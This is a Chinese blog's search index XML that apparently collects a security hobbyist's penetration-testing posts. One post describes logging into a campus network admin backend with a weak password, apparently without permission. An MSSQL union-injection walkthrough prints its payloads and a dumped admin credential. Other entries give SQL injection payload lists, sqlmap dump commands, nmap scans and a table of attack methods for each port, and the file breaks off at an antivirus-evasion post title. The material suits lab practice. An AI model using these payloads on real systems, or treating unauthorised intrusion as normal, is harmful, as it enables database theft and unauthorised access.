<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>记去年偶然一次进入校园网..</title>
      <link href="/2021/07/10/ji-qu-nian-ou-ran-yi-ci-jin-ru-xiao-yuan-wang/"/>
      <url>/2021/07/10/ji-qu-nian-ou-ran-yi-ci-jin-ru-xiao-yuan-wang/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>去年刚搬到新校区，偶然一次无聊的时候，随便测试了下，把校园网后台测试出来，也就进去随便看了看，感觉就那样好像。<br>主要还是管理员太疏忽了，弱口令直接进了。</p><h2 id="直接看图吧。"><a href="#直接看图吧。" class="headerlink" title="直接看图吧。"></a>直接看图吧。</h2><p><img src="4.jpg"><br><img src="5.jpg"><br><img src="3.jpg"><br><img src="2.jpg"><br><img src="1.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> -web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -web渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mssql联合注入</title>
      <link href="/2021/07/08/mssql-lian-he-zhu-ru/"/>
      <url>/2021/07/08/mssql-lian-he-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h2 id="mssql实战联合注入"><a href="#mssql实战联合注入" class="headerlink" title="mssql实战联合注入"></a>mssql实战联合注入</h2><p>刚开始学习mssql联合注入的时候用到的是墨者的靶场做的实验。</p><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>显示位用null表示<br>union select null,null,null,null<br>加单引号一个个试’<br>union select null,’null’,null,null<br>联合查询加all，<br>union all select null,null,null,null</p><h3 id="寻找注入点"><a href="#寻找注入点" class="headerlink" title="寻找注入点"></a>寻找注入点</h3><p><img src="1.png"><br><img src="11.png"><br><img src="111.png"></p><h3 id="猜测列数："><a href="#猜测列数：" class="headerlink" title="猜测列数："></a>猜测列数：</h3><p><img src="2.png"></p><h3 id="寻找回显位："><a href="#寻找回显位：" class="headerlink" title="寻找回显位："></a>寻找回显位：</h3><p>and 1=2 union all select null,null,’3’,null   and 1=2 和 -2是一样的效果<br><img src="22.png"></p><h3 id="查询版本信息："><a href="#查询版本信息：" class="headerlink" title="查询版本信息："></a>查询版本信息：</h3><p>and 1=2 union all select null,(select @@version),’3’,null<br><img src="banben.png"></p><h3 id="查询库："><a href="#查询库：" class="headerlink" title="查询库："></a>查询库：</h3><p>and 1=2 union all select null,(select db_name()),’3’,null<br><img src="ku.png"></p><h3 id="查询表："><a href="#查询表：" class="headerlink" title="查询表："></a>查询表：</h3><p>and 1=2 union all select null,(select top 1 name from mozhe_db_v2.dbo.sysobjects where xtype=’u’),’3’,null<br><img src="biao.png"></p><h3 id="查询下一个表-利用top-和-lt-gt"><a href="#查询下一个表-利用top-和-lt-gt" class="headerlink" title="查询下一个表:利用top 和 &lt;&gt;"></a>查询下一个表:利用top 和 &lt;&gt;</h3><p><img src="2biao.png"></p><h3 id="查询列："><a href="#查询列：" class="headerlink" title="查询列："></a>查询列：</h3><p>and 1=2 union all select null,column_name,’3’,null from information_schema.columns where table_name=’manage’<br><img src="id.png"></p><h3 id="查询里面的字段："><a href="#查询里面的字段：" class="headerlink" title="查询里面的字段："></a>查询里面的字段：</h3><p>and 1=2 union all select null,(select top 1 col_name (object_id(‘manage’),1) from sysobjects),’3’,null<br><img src="name.png"><br><img src="pass.png"></p><h3 id="查询账号密码"><a href="#查询账号密码" class="headerlink" title="查询账号密码:"></a>查询账号密码:</h3><p>and 1=2 union all select null,(select top 1 password from manage),’3’,null<br><img src="zhanghao.png"><br><img src="mima.png"><br> <code>账号</code> :admin_mz<br> <code>密码</code> :72e1bfc3f01b7583</p><h3 id="常用sqlmap注入"><a href="#常用sqlmap注入" class="headerlink" title="常用sqlmap注入"></a>常用sqlmap注入</h3><h4 id="常用命令："><a href="#常用命令：" class="headerlink" title="常用命令："></a>常用命令：</h4><pre class="line-numbers language-js"><code class="language-js">测试注入：python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"url"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="注数据库："><a href="#注数据库：" class="headerlink" title="注数据库："></a>注数据库：</h4><pre class="line-numbers language-js"><code class="language-js">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"url"</span> <span class="token operator">--</span>dbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="注当前数据库："><a href="#注当前数据库：" class="headerlink" title="注当前数据库："></a>注当前数据库：</h4><pre class="line-numbers language-js"><code class="language-js">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"url"</span> <span class="token operator">--</span>current<span class="token operator">-</span>db<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="注当前数据库用户名："><a href="#注当前数据库用户名：" class="headerlink" title="注当前数据库用户名："></a>注当前数据库用户名：</h4><pre class="line-numbers language-js"><code class="language-js">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"url"</span> <span class="token operator">--</span>current<span class="token operator">-</span>user<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="注表名："><a href="#注表名：" class="headerlink" title="注表名："></a>注表名：</h4><pre class="line-numbers language-js"><code class="language-js">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"url"</span> <span class="token operator">-</span>D 库名 <span class="token operator">--</span>tables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="注列名："><a href="#注列名：" class="headerlink" title="注列名："></a>注列名：</h4><pre class="line-numbers language-js"><code class="language-js">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"url"</span> <span class="token operator">-</span>D 库名 <span class="token operator">-</span>T 表名 <span class="token operator">--</span>columns<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="注数据："><a href="#注数据：" class="headerlink" title="注数据："></a>注数据：</h4><pre class="line-numbers language-js"><code class="language-js">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"url"</span> <span class="token operator">-</span>D 库名 <span class="token operator">-</span>T 表名 <span class="token operator">-</span>C 列名<span class="token punctuation">,</span>列名 <span class="token operator">--</span>dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="查询表条数："><a href="#查询表条数：" class="headerlink" title="查询表条数："></a>查询表条数：</h4><pre class="line-numbers language-js"><code class="language-js">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"url"</span> <span class="token operator">--</span>count <span class="token operator">-</span>D 当前数据库名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> -SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入</title>
      <link href="/2021/07/08/sql-zhu-ru/"/>
      <url>/2021/07/08/sql-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>不管用什么语言编写的Web应用，它们都用一个共同点，具有交互性并且多数是数据库驱动。在网络中，数据库驱动的Web应用随处可见，由此而存在的SQL注入是影响企业运营且最具破坏性的漏洞之一。</p><h2 id="一、什么是SQL"><a href="#一、什么是SQL" class="headerlink" title="一、什么是SQL"></a>一、什么是SQL</h2><p>SQL（Struct Query Language）结构化查询语言，是一种面向数据库的编程语言，它可以对数据库中的信息进行增删改查操作。SQL可以与多种数据库程序协同工作，比如 MS Access、DB2、Informix、MS SQL Server、Oracle、Sybase 以及其他数据库系统。</p><h2 id="二、什么是SQL注入"><a href="#二、什么是SQL注入" class="headerlink" title="二、什么是SQL注入"></a>二、什么是SQL注入</h2><p>攻击者通过精心构造SQL语句达到欺骗服务器、绕过服务器的检测过滤，最终达到执行该SQL语句，并且输出攻击者想要获取的隐秘信息的过程。</p><h2 id="三、Sql注入是怎么产生的"><a href="#三、Sql注入是怎么产生的" class="headerlink" title="三、Sql注入是怎么产生的"></a>三、Sql注入是怎么产生的</h2><p>WEB交互少不了从WEB页面接收用户输入的信息，并且对其进行操作，最终完成交互的目的。有一句话说的好就是“有输入的地方就有风险”，如果对用户的输入不加过滤，直接带入数据库执行，那么就会产生一定的安全风险。例如：</p><p><a href="http://xxx.com/sql?id=1">http://xxx.com/sql?id=1</a></p><p>select username,password from user where id = 3</p><p><a href="http://xxx.com/sql?id=1">http://xxx.com/sql?id=1</a> union select….</p><p>select username,password from user where id = 3 union select ….</p><p>Mysql注入部分</p><p>获取字段数:order by x 取临界值</p><p>获取数据库名:database()</p><p>获取版本version()</p><p>Information_schema, mysql 5.0以上版本自带数据库,它记录有当前mysql下所有的数据库名，表名，列名信息</p><p>Information_schema.tables; 记录表名信息的表</p><p>Information_schema.columns; 记录列名信息的表</p><p>Table_name 表名</p><p>Column_name 列名</p><p>Schema_table 数据库名</p><p>数据库中符号”.”代表下一级的意思</p><p>Information_schema.tables 也就是 Information_schema数据库下的tables表</p><p>常用函数，进行信息收集</p><p>Version() –mysql版本</p><p>User() –数据库用户名</p><p>database() –数据库名</p><p>@@datadir —数据库路径</p><p>@@version_compile_os –操作系统版本</p><p>system_user() //系统用户名</p><p>user() //用户名</p><p>current_user() //当前用户名</p><p>session_user() //连接数据库的用户名</p><p>Concat</p><p>Concat_ws</p><p>Group_concat</p><p>–+可以用#替换,url提交过程中Url编码后的#为%23 ‘是%27 空格%20</p><p>Or 1=1–+</p><p>‘ or 1=1–+</p><p>) or 1=1–+</p><p>‘) or 1=1–+</p><p>“) or 1=1–+</p><p>“)) or 1=1–+</p><p>Union 内部的select语句必须拥有相同数量的列。</p><p>Mysql关键的表 重点！！！</p><p>Mysql 有一个系统数据库 information_schema，存储着所有的数据库的相关信息，一般的， 我们利用该表可以进行一次完整的注入。以下为一般的流程。</p><p>猜数据库</p><p>select schema_name from information_schema.schemata</p><p>schema_name是数据库名 information_schema.schemata存储了所有的数据库名字</p><p>猜某库的数据表</p><p>这个查询某个特定的表</p><p>select table_name from information_schema.tables where table_schema=’xxxxx’</p><p>要是这样select table_name from information_schema.tables就是查询所有的表</p><p>table_schema是数据库的名称，table_name是具体的表名 information_schema.tables存储了所有的表名</p><p>猜某表的所有列</p><p>这个查询某个特定的表</p><p>Select column_name from information_schema.columns where table_name=’xxxxx’</p><p>要是这样Select column_name from information_schema.columns就是查询所有的列</p><p>column_name是列名 table_name是表名 information_schema.columns存储了所有的列名</p><p>获取某列的内容</p><p>Select *** from ****</p>]]></content>
      
      
      <categories>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nmap用法：</title>
      <link href="/2021/07/08/nmap-yong-fa/"/>
      <url>/2021/07/08/nmap-yong-fa/</url>
      
        <content type="html"><![CDATA[<h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><p>NMAP是由GOrdon Lyon设计并实现的，于1997开始发布。最初设计NMAP的目的只是要打造一款强大的端口扫描工具。但随着时间的发展，NMAP的功能越来越全面，从简单的网络连接端口扫描工具变身成为全方位的安全和网络工具组件。<br>具备的主要功能：<br>1、主机发现端口扫描<br>2、服务和版本检测<br>3、操作系统检测<br>除了这些基本功能以外，NMAP还实现了一些高级审计功能，例如：我伪造发起端口扫描的身份，进行隐蔽扫描，对系统进行安全漏洞检测等….</p><h2 id="Nmap-典型用途："><a href="#Nmap-典型用途：" class="headerlink" title="Nmap 典型用途："></a>Nmap 典型用途：</h2><p>主机发现-识别网络上的主机。例如列出响应TCP和/或ICMP请求或打开特定端口的主机。<br>端口扫描 - 枚举目标主机上的开放端口。<br>版本检测 - 询问远程设备上的网络服务以确定应用程序名称和版本号。<br>OS检测 - 确定网络设备的操作系统和硬件特性。<br>软件版本检测脆弱性的漏洞（Nmap的脚本）</p><h2 id="Nmap常用扫描参数说明"><a href="#Nmap常用扫描参数说明" class="headerlink" title="Nmap常用扫描参数说明"></a>Nmap常用扫描参数说明</h2><p><img src="1.png"></p><h2 id="Nmap脚本分类"><a href="#Nmap脚本分类" class="headerlink" title="Nmap脚本分类"></a>Nmap脚本分类</h2><pre class="line-numbers language-js"><code class="language-js">auth<span class="token punctuation">:</span> 负责处理鉴权证书（绕开鉴权）的脚本  broadcast<span class="token punctuation">:</span> 在局域网内探查更多服务开启状况，如dhcp<span class="token operator">/</span>dns<span class="token operator">/</span>sqlserver等服务  brute<span class="token punctuation">:</span> 提供暴力破解方式，针对常见的应用如http<span class="token operator">/</span>snmp等  <span class="token keyword">default</span><span class="token punctuation">:</span> 使用<span class="token operator">-</span>sC或<span class="token operator">-</span>A选项扫描时候默认的脚本，提供基本脚本扫描能力  discovery<span class="token punctuation">:</span> 对网络进行更多的信息，如SMB枚举、SNMP查询等  dos<span class="token punctuation">:</span> 用于进行拒绝服务攻击  exploit<span class="token punctuation">:</span> 利用已知的漏洞入侵系统  external<span class="token punctuation">:</span> 利用第三方的数据库或资源，例如进行whois解析  fuzzer<span class="token punctuation">:</span> 模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞 intrusive<span class="token punctuation">:</span> 入侵性的脚本，此类脚本可能引发对方的IDS<span class="token operator">/</span>IPS的记录或屏蔽  malware<span class="token punctuation">:</span> 探测目标机是否感染了病毒、开启了后门等信息  safe<span class="token punctuation">:</span> 此类与intrusive相反，属于安全性脚本  version<span class="token punctuation">:</span> 负责增强服务与版本扫描（Version Detection）功能的脚本  vuln<span class="token punctuation">:</span> 负责检查目标机是否有常见的漏洞（Vulnerability），如是否有MS08_067<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="实例："><a href="#实例：" class="headerlink" title="实例："></a>实例：</h2><pre class="line-numbers language-js"><code class="language-js">sP ：进行ping扫描 （打印出对ping扫描做出响应的主机<span class="token punctuation">,</span><span class="token function">不做进一步测试</span><span class="token punctuation">(</span>如端口扫描或者操作系统探测<span class="token punctuation">)</span>）nmap <span class="token operator">-</span>sP <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">3.0</span><span class="token operator">/</span><span class="token number">24</span>（这个命令可以用于探测局域网有哪些机器）<span class="token operator">-</span>sS ：半开放扫描（非<span class="token number">3</span>次握手的tcp扫描）使用频率最高的扫描选项：SYN扫描<span class="token punctuation">,</span>又称为半开放扫描，它不打开一个完全的TCP连接，执行得很快，效率高（一个完整的tcp连接需要<span class="token number">3</span>次握手，而<span class="token operator">-</span>sS选项不需要<span class="token number">3</span>次握手）优点：Nmap发送SYN包到远程主机，但是它不会产生任何会话，目标主机几乎不会把连接记入系统日志。（防止对方判断为扫描攻击），扫描速度快，效率高，在工作中使用频率最高缺点：它需要root<span class="token operator">/</span>administrator权限执行nmap  <span class="token operator">-</span>sS <span class="token operator">-</span>p <span class="token number">1</span><span class="token operator">-</span><span class="token number">65535</span>  <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">3.16</span>   （扫描目标开放的所有端口<span class="token operator">-</span>半开式）sT：<span class="token number">3</span>次握手方式tcp的扫描优点：普通用户也可以使用。缺点：这种扫描很容易被检测到，在目标主机的日志中会记录大批的连接请求以及错误信息，由于它要完成<span class="token number">3</span>次握手，效率低，速度慢，建议使用<span class="token operator">-</span>sS <span class="token function">sV：扫描目标地址开放服务</span><span class="token punctuation">(</span>端口<span class="token punctuation">)</span><span class="token function">版本</span><span class="token punctuation">(</span>sV<span class="token punctuation">)</span>版本检测是用来扫描目标主机和端口上运行的软件的版本，如下扫描，多出了ssh的版本信息 。nmap <span class="token operator">-</span>sV <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">3.16</span><span class="token operator">-</span>O：扫描目标地址进行操作系统版本nmap <span class="token operator">-</span>O <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">3.16</span><span class="token operator">-</span>A：OS识别<span class="token punctuation">,</span>版本探测<span class="token punctuation">,</span>脚本扫描和综合扫描nmap <span class="token operator">-</span>A <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">3.16</span><span class="token operator">-</span>Pn <span class="token operator">-</span>A 绕过防火墙进行全面扫描nmap <span class="token operator">-</span>Pn <span class="token operator">-</span>A <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">3.16</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Nmap脚本演示实例："><a href="#Nmap脚本演示实例：" class="headerlink" title="Nmap脚本演示实例："></a>Nmap脚本演示实例：</h3><pre class="line-numbers language-js"><code class="language-js">nmap <span class="token operator">--</span>script<span class="token operator">=</span>auth <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">3.26</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="2.png"></p><pre class="line-numbers language-js"><code class="language-js">nmap <span class="token operator">--</span>script<span class="token operator">=</span>vuln <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">3.26</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="3.png"></p><pre class="line-numbers language-js"><code class="language-js">nmap <span class="token operator">-</span>sS <span class="token operator">-</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="4.png"></p><pre class="line-numbers language-js"><code class="language-js">nmap <span class="token operator">-</span>sS <span class="token operator">-</span>p <span class="token number">1</span><span class="token operator">-</span><span class="token number">65535</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="5.png"></p><h3 id="本章节端口号扫描，在知道对方真实IP地址的实话可以尝试用端口扫描对对方进行扫描，对对方的子域名进行扫描。能扫到对方的系统类别，版本信息，等等一些信息。端口号开了那些服务也是信息收集很重要的一部分。"><a href="#本章节端口号扫描，在知道对方真实IP地址的实话可以尝试用端口扫描对对方进行扫描，对对方的子域名进行扫描。能扫到对方的系统类别，版本信息，等等一些信息。端口号开了那些服务也是信息收集很重要的一部分。" class="headerlink" title="本章节端口号扫描，在知道对方真实IP地址的实话可以尝试用端口扫描对对方进行扫描，对对方的子域名进行扫描。能扫到对方的系统类别，版本信息，等等一些信息。端口号开了那些服务也是信息收集很重要的一部分。"></a>本章节端口号扫描，在知道对方真实IP地址的实话可以尝试用端口扫描对对方进行扫描，对对方的子域名进行扫描。能扫到对方的系统类别，版本信息，等等一些信息。端口号开了那些服务也是信息收集很重要的一部分。</h3><p>端口号开了那些服务也是信息收集很重要的一部分。</p><h2 id="常见的端口信息及渗透方法"><a href="#常见的端口信息及渗透方法" class="headerlink" title="常见的端口信息及渗透方法"></a>常见的端口信息及渗透方法</h2><pre class="line-numbers language-js"><code class="language-js">    端口号      端口服务<span class="token operator">/</span>协议简要说明       关于端口可能的一些渗透用途 tcp <span class="token number">21</span>    ftp 默认的数据和命令传输端口<span class="token punctuation">[</span>可明文亦可加密传输<span class="token punctuation">]</span>  允许匿名的上传下载<span class="token punctuation">,</span>爆破<span class="token punctuation">,</span>嗅探<span class="token punctuation">,</span>win提权<span class="token punctuation">,</span><span class="token function">远程执行</span><span class="token punctuation">(</span>proftpd <span class="token number">1.3</span><span class="token punctuation">.</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">各类后门</span><span class="token punctuation">(</span>proftpd<span class="token punctuation">,</span>vsftp <span class="token number">2.3</span><span class="token punctuation">.</span><span class="token number">4</span><span class="token punctuation">)</span> tcp <span class="token number">22</span>    ssh<span class="token punctuation">[</span>数据ssl加密传输<span class="token punctuation">]</span>    可根据已搜集到的信息尝试爆破<span class="token punctuation">,</span>v1版本可中间人<span class="token punctuation">,</span>ssh隧道及内网代理转发<span class="token punctuation">,</span>文件传输<span class="token punctuation">,</span>等等…常用于linux远程管理…tcp <span class="token number">23</span>    telnet<span class="token punctuation">[</span>明文传输<span class="token punctuation">]</span>    爆破<span class="token punctuation">,</span>嗅探<span class="token punctuation">,</span>一般常用于路由<span class="token punctuation">,</span>交换登陆<span class="token punctuation">,</span>可尝试弱口令<span class="token punctuation">,</span>也许会有意想不到的收获 tcp <span class="token number">25</span>    smtp<span class="token punctuation">[</span>简单邮件传输协议<span class="token punctuation">,</span>多数linux发行版可能会默认开启此服务<span class="token punctuation">]</span>    邮件伪造<span class="token punctuation">,</span>vrfy<span class="token operator">/</span>expn 查询邮件用户信息<span class="token punctuation">,</span>可使用smtp<span class="token operator">-</span>user<span class="token operator">-</span><span class="token keyword">enum</span>工具来自动跑 tcp<span class="token operator">/</span>udp <span class="token number">53</span>    dns<span class="token punctuation">[</span>域名解析<span class="token punctuation">]</span>    允许区域传送<span class="token punctuation">,</span>dns劫持<span class="token punctuation">,</span>缓存投毒<span class="token punctuation">,</span>欺骗以及各种基于dns隧道的远控 tcp<span class="token operator">/</span>udp <span class="token number">69</span>    tftp<span class="token punctuation">[</span>简单文件传输协议<span class="token punctuation">,</span>无认证<span class="token punctuation">]</span>    尝试下载目标及其的各类重要配置文件 tcp <span class="token number">80</span><span class="token operator">-</span><span class="token number">89</span><span class="token punctuation">,</span><span class="token number">443</span><span class="token punctuation">,</span><span class="token number">8440</span><span class="token operator">-</span><span class="token number">8450</span><span class="token punctuation">,</span><span class="token number">8080</span><span class="token operator">-</span><span class="token number">8089</span>    web<span class="token punctuation">[</span>各种常用的web服务端口<span class="token punctuation">]</span>    各种常用web服务端口<span class="token punctuation">,</span>可尝试经典的top n<span class="token punctuation">,</span>vpn<span class="token punctuation">,</span>owa<span class="token punctuation">,</span>webmail<span class="token punctuation">,</span>目标oa<span class="token punctuation">,</span>各类java控制台<span class="token punctuation">,</span>各类服务器web管理面板<span class="token punctuation">,</span>各类web中间件漏洞利用<span class="token punctuation">,</span>各类web框架漏洞利用等等…… tcp <span class="token number">110</span>    <span class="token punctuation">[</span>邮局协议<span class="token punctuation">,</span>可明文可密文<span class="token punctuation">]</span>    可尝试爆破<span class="token punctuation">,</span>嗅探 tcp <span class="token number">137</span><span class="token punctuation">,</span><span class="token number">139</span><span class="token punctuation">,</span><span class="token number">445</span>    samba<span class="token punctuation">[</span>smb实现windows和linux间文件共享<span class="token punctuation">,</span>明文<span class="token punctuation">]</span>    可尝试爆破以及smb自身的各种远程执行类漏洞利用<span class="token punctuation">,</span>如<span class="token punctuation">,</span>ms08<span class="token number">-067</span><span class="token punctuation">,</span>ms17<span class="token number">-010</span><span class="token punctuation">,</span>嗅探等…… tcp <span class="token number">143</span>    imap<span class="token punctuation">[</span>可明文可密文<span class="token punctuation">]</span>    可尝试爆破 udp <span class="token number">161</span>    snmp<span class="token punctuation">[</span>明文<span class="token punctuation">]</span>    爆破默认团队字符串<span class="token punctuation">,</span>搜集目标内网信息 tcp <span class="token number">389</span>    ldap<span class="token punctuation">[</span>轻量级目录访问协议<span class="token punctuation">]</span>    ldap注入<span class="token punctuation">,</span>允许匿名访问<span class="token punctuation">,</span>弱口令 tcp <span class="token number">512</span><span class="token punctuation">,</span><span class="token number">513</span><span class="token punctuation">,</span><span class="token number">514</span>    linux rexec    可爆破<span class="token punctuation">,</span>rlogin登陆 tcp <span class="token number">873</span>    rsync备份服务    匿名访问<span class="token punctuation">,</span>文件上传 tcp <span class="token number">1194</span>    openvpn    想办法钓vpn账号<span class="token punctuation">,</span>进内网 tcp <span class="token number">1352</span>    Lotus domino邮件服务    弱口令<span class="token punctuation">,</span>信息泄漏<span class="token punctuation">,</span>爆破 tcp <span class="token number">1433</span>    mssql数据库    注入<span class="token punctuation">,</span>提权<span class="token punctuation">,</span>sa弱口令<span class="token punctuation">,</span>爆破 tcp <span class="token number">1521</span>    oracle数据库    tns爆破<span class="token punctuation">,</span>注入<span class="token punctuation">,</span>弹shell… tcp <span class="token number">1500</span>    ispmanager 主机控制面板    弱口令 tcp <span class="token number">1025</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">2049</span>    nfs    权限配置不当 tcp <span class="token number">1723</span>    pptp    爆破<span class="token punctuation">,</span>想办法钓vpn账号<span class="token punctuation">,</span>进内网 tcp <span class="token number">2082</span><span class="token punctuation">,</span><span class="token number">2083</span>    cpanel主机管理面板登录    弱口令 tcp <span class="token number">2181</span>    zookeeper    未授权访问 tcp <span class="token number">2601</span><span class="token punctuation">,</span><span class="token number">2604</span>    zebra路由    默认密码zerbra tcp <span class="token number">3128</span>    squid代理服务    弱口令 tcp <span class="token number">3312</span><span class="token punctuation">,</span><span class="token number">3311</span>    kangle主机管理登录    弱口令 tcp <span class="token number">3306</span>    mysql数据库    注入<span class="token punctuation">,</span>提权<span class="token punctuation">,</span>爆破 tcp <span class="token number">3389</span>    windows rdp远程桌面    shift后门<span class="token punctuation">,</span>爆破<span class="token punctuation">,</span>ms12<span class="token number">-020</span><span class="token punctuation">[</span>蓝屏exp<span class="token punctuation">]</span> tcp <span class="token number">4848</span>    glassfish控制台    弱口令 tcp <span class="token number">4899</span>    radmin远程桌面管理工具<span class="token punctuation">,</span> 抓密码拓展机器 tcp <span class="token number">5000</span>    sybase<span class="token operator">/</span>DB2数据库    爆破<span class="token punctuation">,</span>注入 tcp <span class="token number">5432</span>    postgresql数据库    爆破<span class="token punctuation">,</span>注入<span class="token punctuation">,</span>弱口令 tcp <span class="token number">5632</span>    pcanywhere远程桌面管理工具    抓密码<span class="token punctuation">,</span>代码执行tcp <span class="token number">5900</span><span class="token punctuation">,</span><span class="token number">5901</span><span class="token punctuation">,</span><span class="token number">5902</span>    vnc远程桌面管理工具    弱口令爆破<span class="token punctuation">,</span>如果信息搜集不到位<span class="token punctuation">,</span>成功几率很小 tcp <span class="token number">5984</span>    CouchDB    未授权导致的任意指令执行 tcp <span class="token number">6379</span>    redis未授权    可尝试未授权访问<span class="token punctuation">,</span>弱口令爆破 tcp <span class="token number">7001</span><span class="token punctuation">,</span><span class="token number">7002</span>    weblogic控制台    java反序列化<span class="token punctuation">,</span>弱口令 tcp <span class="token number">7778</span>    kloxo    主机面板登录 tcp <span class="token number">8000</span>    Ajenti主机控制面板    弱口令 tcp <span class="token number">8443</span>    plesk主机控制面板    弱口令 tcp <span class="token number">8069</span>    zabbix    远程执行<span class="token punctuation">,</span>sql注入 tcp <span class="token number">8080</span><span class="token operator">-</span><span class="token number">8089</span>    Jenkins<span class="token punctuation">,</span>jboss    反序列化<span class="token punctuation">,</span>控制台弱口令 tcp <span class="token number">9080</span><span class="token operator">-</span><span class="token number">9081</span><span class="token punctuation">,</span><span class="token number">9090</span>    websphere控制台    java反序列化<span class="token operator">/</span>弱口令 tcp <span class="token number">9200</span><span class="token punctuation">,</span><span class="token number">9300</span>    elasticsearch    远程执行 tcp <span class="token number">10000</span>    webmin linux主机web控制面板入口    弱口令 tcp <span class="token number">11211</span>    memcached    未授权访问 tcp <span class="token number">27017</span><span class="token punctuation">,</span><span class="token number">27018</span>    mongodb    爆破<span class="token punctuation">,</span>未授权访问 tcp <span class="token number">3690</span>    svn服务    svn泄露<span class="token punctuation">,</span>未授权访问 tcp <span class="token number">50000</span>    SAP Management Console    远程执行 tcp <span class="token number">50070</span><span class="token punctuation">,</span><span class="token number">50030</span>    hadoop    默认端口未授权访问<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> -web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>过火绒静态免杀</title>
      <link href="/2021/07/08/guo-huo-rong-mian-sha/"/>
      <url>/2021/07/08/guo-huo-rong-mian-sha/</url>
      
